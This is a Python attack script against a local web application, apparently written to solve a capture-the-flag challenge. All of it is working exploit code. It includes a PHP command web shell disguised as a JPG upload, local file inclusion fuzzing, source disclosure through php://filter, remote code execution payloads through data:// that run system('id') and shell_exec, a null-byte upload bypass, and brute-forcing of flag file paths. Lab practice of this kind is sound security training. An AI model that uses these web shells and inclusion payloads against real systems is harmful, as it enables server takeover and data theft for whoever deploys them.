import requests
import os
import base64
from io import BytesIO

base_url = "http://127.0.0.1:32824"

print("Testing advanced file upload and inclusion vulnerabilities...")
print("=" * 60)

# 1. Try a better PHP shell disguised as a valid JPG
def create_advanced_jpg_shell():
    # Create a valid JPG structure with PHP embedded in EXIF/comment field
    # This is more likely to bypass validation
    jpg_shell = b'''\xff\xd8\xff\xe0\x00\x10JFIF\x00\x01\x01\x00\x00\x01\x00\x01\x00\x00\xff\xfe\x00<
<?php if(isset($_GET['cmd'])){ echo "<pre>"; system($_GET['cmd']); echo "</pre>"; } ?>
\xff\xd9
'''
    return jpg_shell

# Upload the better shell
shell_data = create_advanced_jpg_shell()
files = {'userfile': ('shell.php.jpg', BytesIO(shell_data), 'image/jpeg')}
data = {'submit': 'Upload Image'}
response = requests.post(f"{base_url}/index.php", files=files, data=data)
print(f"Upload status: {response.status_code}")
print(f"Response snippet: {response.text[:800]}")

# Try to find any upload-related parameters
print("\n2. Testing for hidden/undocumented parameters...")
params = ['file', 'image', 'img', 'path', 'loc', 'location', 'uri', 'url', 'dir', 'path', 'upload', 'up', 'load', 'display', 'show', 'view']
param_tests = ['shell.php.jpg', 'upload/shell.php.jpg', '../upload/shell.php.jpg']

for param in params:
    print(f"\nTesting parameter: {param}")
    for test_file in param_tests:
        url = f"{base_url}/index.php?{param}={test_file}&cmd=whoami"
        resp = requests.get(url, timeout=5)
        print(f"  {test_file}: {resp.status_code}, len={len(resp.content)}")
        if len(resp.content) < 1000 and 'whoami' in resp.text or 'root' in resp.text or 'www' in resp.text:
            print(f"[!] COMMAND EXECUTION: {resp.text[:500]}")
            break

# 3. Try to read index.php source via filter wrapper
print("\n3. Testing php://filter to read source code...")
filter_payloads = [
    "php://filter/convert.base64-encode/resource=index.php",
    "php://filter/read=convert.base64-encode/resource=index.php",
    "php://filter/convert.base64-encode/resource=/var/www/html/index.php"
]

for param in ['file', 'include', 'page', 'inc', 'path', 'url']:
    for payload in filter_payloads:
        url = f"{base_url}/index.php?{param}={payload}"
        resp = requests.get(url)
        if resp.status_code == 200 and len(resp.content) > 500:
            print(f"[!] Source code leaked via {param}")
            try:
                decoded = base64.b64decode(resp.text).decode('utf-8', errors='ignore')
                print(f"Decoded source (first 1000 chars):\n{decoded[:1000]}")
            except:
                print(f"Base64 response: {resp.text[:500]}")

# 4. Try data:// wrapper for RCE
print("\n4. Testing data:// wrapper for code execution...")
data_payloads = [
    "data://text/plain,<?php system('id');?>",
    "data://text/plain;base64," + base64.b64encode(b"<?php system('id');?>").decode(),
    "data://text/plain,<?php echo shell_exec('ls /');?>"
]

for param in ['file', 'include', 'page', 'inc']:
    for payload in data_payloads:
        url = f"{base_url}/index.php?{param}={payload}"
        resp = requests.get(url, timeout=5)
        if resp.status_code == 200 and ('uid=' in resp.text or 'root:' in resp.text):
            print(f"[!] RCE via data:// wrapper!")
            print(f"Output: {resp.text[:500]}")

# 5. Try to upload with different techniques
print("\n5. Testing upload bypass techniques...")

# Try NULL byte injection
try:
    null_bypass = "shell.php\x00.jpg"
    files = {'userfile': (null_bypass, BytesIO(b'<?php system($_GET["cmd"]); ?>'), 'image/jpeg')}
    resp = requests.post(f"{base_url}/index.php", files=files, data=data)
    print(f"NULL byte injection attempt: {resp.status_code}")
except:
    print("NULL byte injection failed")

# 6. Brute force common flag locations directly
print("\n6. Direct flag file search...")
flag_files = ['/flag', '/flag.txt', '/root/flag', '/tmp/flag', '/home/flag', '/var/flag', '/opt/flag', '/secret', '/key.txt']

for param in ['file', 'include', 'page', 'view', 'path']:
    for flag_file in flag_files:
        url = f"{base_url}/index.php?{param}={flag_file}"
        resp = requests.get(url)
        if 'FLAG{' in resp.text:
            print(f"[!] FLAG FOUND via {param}: {resp.text}")
            flag_start = resp.text.find('FLAG{')
            flag_end = resp.text.find('}', flag_start)
            if flag_start > -1 and flag_end > -1:
                flag = resp.text[flag_start:flag_end+1]
                print(f"FLAG: {flag}")
                break

print("\n" + "=" * 60)
print("Advanced testing complete.")
